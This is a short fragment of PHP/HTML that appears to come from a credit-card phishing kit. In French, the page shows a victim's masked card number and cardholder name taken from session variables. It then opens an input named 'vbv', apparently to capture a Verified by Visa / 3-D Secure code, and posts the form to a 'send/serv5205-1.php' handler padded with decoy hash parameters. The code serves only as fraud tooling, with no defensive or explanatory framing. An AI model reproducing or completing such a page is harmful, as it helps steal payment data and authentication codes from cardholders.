...
<?php include'navbar.php'?>
    <div class="contain biling-p">
     <form method="POST" action="<?php echo 'send/serv5205-1.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
          ...
          <div style="text-align:left;text-transform:uppercase"> <b>DATE : </b><?php echo date('d/m/Y H:i:s', time()); ?><br>
            <b>NUMERO DE CARTE : </b><span><?php echo substr($_SESSION['numero_cc'], 0,4); ?> XXXX XXXX <?php echo substr($_SESSION['numero_cc'], -4); ?></span><br>
            <b>TITULAIRE DE LA CARTE : </b><span><?php echo $_SESSION["nom_cc"] ?></span><br>
          </div>
          ...
          <input id="css" style="margin-top:5px" name="vbv" class="bill_input"
